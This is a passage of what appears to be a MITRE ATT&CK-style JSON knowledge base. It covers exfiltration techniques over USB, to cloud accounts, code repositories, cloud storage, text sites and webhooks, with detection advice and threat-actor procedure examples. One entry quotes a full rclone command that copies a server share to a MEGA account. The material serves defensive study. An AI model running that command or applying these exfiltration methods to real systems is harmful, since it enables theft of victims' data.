    "description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "detection": "Monitor file access on removable media. Detect processes that execute when removable media are mounted.",
    "procedures": [
      "[S0035] SPACESHIP: SPACESHIP copies staged data to removable drives when they are inserted into the system.",
      "[S0125] Remsec: Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.",
      "[S0136] USBStealer: USBStealer exfiltrates collected files via removable media from air-gapped victims.",
      "[G0081] Tropic Trooper: Tropic Trooper has exfiltrated data using USB storage devices.",
      "[G0129] Mustang Panda: Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.",
      "[S0092] Agent.btz: Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.",
      "[S0409] Machete: Machete has a feature to copy files from every drive onto a removable drive in a hidden folder."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1537",
    "technique_name": "Transfer Data to Cloud Account",
    "description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service. A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces. Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI. Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.",
    "detection": "Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. In AWS, sharing an Elastic Block Store (EBS) snapshot, either with specified users or publicly, generates a ModifySnapshotAttribute event in CloudTrail logs. Similarly, in Azure, creating a Shared Access Signature (SAS) URI for a Virtual Hard Disk (VHS) snapshot generates a \"Get Snapshot SAS URL\" event in Activity Logs.",
    "procedures": [
      "[G1032] INC Ransom: INC Ransom has used Megasync to exfiltrate data to the cloud.",
      "[G1039] RedCurl: RedCurl has used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1567.001",
    "technique_name": "Exfiltration Over Web Service: Exfiltration to Code Repository",
    "description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection. Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
    "procedures": [
      "[S0363] Empire: Empire can use GitHub for data exfiltration."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1567.002",
    "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
    "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet. Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
    "procedures": [
      "[G0065] Leviathan: Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.",
      "[G1024] Akira: Akira will exfiltrate victim data using applications such as Rclone.",
      "[G1014] LuminousMoth: LuminousMoth has exfiltrated data to Google Drive.",
      "[S1040] Rclone: Rclone can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.",
      "[S0629] RainyDay: RainyDay can use a file exfiltration tool to upload specific files to Dropbox.",
      "[S1023] CreepyDrive: CreepyDrive can use cloud services including OneDrive for data exfiltration.",
      "[S0037] HAMMERTOSS: HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.",
      "[G0094] Kimsuky: Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts.",
      "[G0027] Threat Group-3390: Threat Group-3390 has exfiltrated stolen data to Dropbox.",
      "[S1170] ODAgent: ODAgent can use an attacker-controlled OneDrive account for exfiltration.",
      "[G0142] Confucius: Confucius has exfiltrated victim data to cloud storage service accounts.",
      "[G1005] POLONIUM: POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts.",
      "[G1001] HEXANE: HEXANE has used cloud services, including OneDrive, for data exfiltration.",
      "[C0015] C0015: During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command `rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.",
      "[S0660] Clambling: Clambling can send files from a victim's machine to Dropbox.",
      "[G1021] Cinnamon Tempest: Cinnamon Tempest has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.",
      "[S0538] Crutch: Crutch has exfiltrated stolen data to Dropbox.",
      "[S1172] OilBooster: OilBooster can exfiltrate files to an actor-controlled OneDrive account via the Microsoft Graph API.",
      "[S0340] Octopus: Octopus has exfiltrated data to file sharing sites.",
      "[G0102] Wizard Spider: Wizard Spider has exfiltrated stolen victim data to various cloud storage providers.",
      "[G0119] Indrik Spider: Indrik Spider has exfiltrated data using Rclone or MEGASync prior to deploying ransomware.",
      "[G0010] Turla: Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared.",
      "[G0125] HAFNIUM: HAFNIUM has exfiltrated data to file sharing sites, including MEGA.",
      "[S0363] Empire: Empire can use Dropbox for data exfiltration.",
      "[G1006] Earth Lusca: Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA.",
      "[G1003] Ember Bear: Ember Bear has used tools such as Rclone to exfiltrate information from victim environments to cloud storage such as `mega.nz`.",
      "[G1022] ToddyCat: ToddyCat has used a DropBox uploader to exfiltrate stolen files.",
      "[G0128] ZIRCONIUM: ZIRCONIUM has exfiltrated stolen data to Dropbox.",
      "[C0040] APT41 DUST: APT41 DUST exfiltrated collected information to OneDrive.",
      "[S0651] BoxCaon: BoxCaon has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.",
      "[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.",
      "[S1102] Pcexter: Pcexter can upload stolen files to OneDrive storage accounts via HTTP `POST`.",
      "[G0114] Chimera: Chimera has exfiltrated stolen data to OneDrive accounts.",
      "[G1015] Scattered Spider: Scattered Spider has exfiltrated victim data to the MEGA file sharing site.",
      "[S0240] ROKRAT: ROKRAT can send collected data to cloud storage services such as PCloud.",
      "[S0635] BoomBox: BoomBox can upload data to dedicated per-victim folders in Dropbox.",
      "[G0046] FIN7: FIN7 has exfiltrated stolen data to the MEGA file sharing site."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1567.003",
    "technique_name": "Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
    "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebin[.]com, are commonly used by developers to share code and other information. Text storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely. **Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.",
    "detection": null,
    "procedures": null,
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1567.004",
    "technique_name": "Exfiltration Over Web Service: Exfiltration Over Webhook",
    "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it. Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.",
    "detection": null,
    "procedures": null,
    "tactics": "TA0010 - Exfiltration"
  }
]